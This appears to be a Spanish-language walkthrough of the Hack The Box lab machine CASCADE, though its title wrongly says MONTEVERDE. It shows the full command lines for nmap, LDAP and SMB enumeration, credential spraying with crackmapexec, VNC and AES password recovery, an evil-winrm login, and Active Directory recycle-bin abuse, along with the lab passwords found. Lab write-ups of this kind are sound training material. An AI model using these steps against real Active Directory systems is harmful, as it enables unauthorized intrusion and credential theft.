# CASCADE-HTB

Desarrollo de la VM MONTEVERDE de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# cat full.nmap 
# Nmap 7.92 scan initiated Sat Apr  2 16:46:34 2022 as: nmap -n -P0 --top-ports 5000 -sS -sC -vv -oA full 10.129.127.249
Nmap scan report for 10.129.127.249
Host is up, received user-set (0.34s latency).
Scanned at 2022-04-02 16:46:34 EDT for 166s
Not shown: 4985 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49173/tcp open  unknown          syn-ack ttl 127

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2022-04-02T20:47:37
|_  start_date: 2022-04-02T20:05:21
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48762/tcp): CLEAN (Timeout)
|   Check 2 (port 41097/tcp): CLEAN (Timeout)
|   Check 3 (port 35696/udp): CLEAN (Timeout)
|   Check 4 (port 23480/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade1.jpg" width=80% />

## 3. Enumeración

- Podemos enumerar utilizando ENUM4LINUX o AUTORECON.
- Identificamos múltiples usuarios de acceso.

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# enum4linux -a -M -l -d 10.129.127.249 > enum4linux.txt
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade2.jpg" width=80% />

- Enumeramos toda la información que podemos a través de LDAP. Encontramos una contrraseña en BASE64.

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# ldapsearch -x -b "dc=cascade,dc=local" -h 10.129.127.249 > ldapsearch.txt
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade3.jpg" width=80% />

- El decode del password es: rY4n5eva

## 4. Explotación

### 4.1. Cracking ONLINE

- Con la contraseña de obtuvimos realizamos cracking. Nuevas credenciales: r.thompson:rY4n5eva

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# crackmapexec smb 10.129.127.249 -u users.txt -p 'rY4n5eva' --shares --pass-pol --continue-on-success
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade4.jpg" width=80% />

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade5.jpg" width=80% />


### 4.2. Accedemos a la carpeta DATA

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# smbclient \\\\10.129.127.249\\Data\\ -U 'r.thompson' 
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade6.jpg" width=80% />


- En la carpeta encontramos un archivo log de VNC

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade7.jpg" width=80% />

- El procedimiento para crackear el password de VNC es conocido: https://github.com/jeroennijhof/vncpwd

- Primero debemos pasar de HEXADECIMAL a BASE64. 

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade8.jpg" width=80% />

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade9.jpg" width=80% />

- Tenemos una nueva contraseña: sT333ve2

### 4.3. CRACKING ONLINE (2)

- Con la contraseña de obtuvimos realizamos cracking. Obtenemos credenciales s.smith:sT333ve2

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# crackmapexec smb 10.129.127.249 -u users.txt -p 'sT333ve2' --shares --pass-pol 
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade10.jpg" width=80% />

- Este nuevo usuario tiene acceso a la carpeta AUDIT$

### 4.4. Accedemos a la carpeta AUDIT$

- Accedemos a la carpeta AUDIT$ y descargamos la información

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# smbclient \\\\10.129.127.249\\Audit$\\ -U 's.smith'  
Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  2 19:22:12 2022
  ..                                  D        0  Sat Apr  2 19:22:12 2022
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

		6553343 blocks of size 4096. 1625550 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade11.jpg" width=80% />

### 4.5. Analizando los archivos SQLITE y Binarios

- Accedemos al archivo AUDIT.DB que está dentro de la carpeta DB. Alli encontramos una contraseña: BQO5l5Kj9MdErXx6Q6AGOw==
- La contraseña parece del tipo BASE64, sin embargo, no están facil porque está encriptado.

```
┌──(root㉿kali)-[~/HT/CASCADE/AUDIT/DB]
└─# sqlite3 Audit.db                                                                                 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Ext1"	TEXT,
	"Ext2"	TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"Username"	TEXT,
	"Name"	TEXT,
	"DistinguishedName"	TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('Ldap',2);
INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
COMMIT;
```

- Decompilamos los archivos: CascAudit.exe y CascCrypto.dll 

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade12.jpg" width=80% />


- Para decompilarlo use el software: https://www.jetbrains.com/decompiler/. Desde Windows.
- Dentro identificamos que el binario descifra el password encriptado en AES: la KEY y el Vector de inicio (IV).

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade13.jpg" width=80% />

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade14.jpg" width=80% />

- Finalmente, en la siguiente página podemos descifrar la contraseña:https://gchq.github.io/CyberChef/

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade15.jpg" width=80% />

### 4.6. Cracking Online (3)

- Identificamos nuevas credenciales arksvc:w3lc0meFr31nd

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade16.jpg" width=80% />

- Accedemos con WINRM

```
┌──(root㉿kali)-[~/HT/CASCADE]
└─# evil-winrm -i 10.129.127.249 -u arksvc -p 'w3lc0meFr31nd'
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade17.jpg" width=80% />


## 5. Elevando Privilegios

### 5.1. Abuse AD RECYCLE group

- Listamos la información borrada del Active Directory (AD)

```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade18.jpg" width=80% />


- La contraseña está en BASE64: baCT3r1aN00dles

- Encontramos el usuario Administrator con la contraseña: baCT3r1aN00dles

<img src="https://github.com/El-Palomo/CASCADE-HTB/blob/main/Cascade19.jpg" width=80% />














































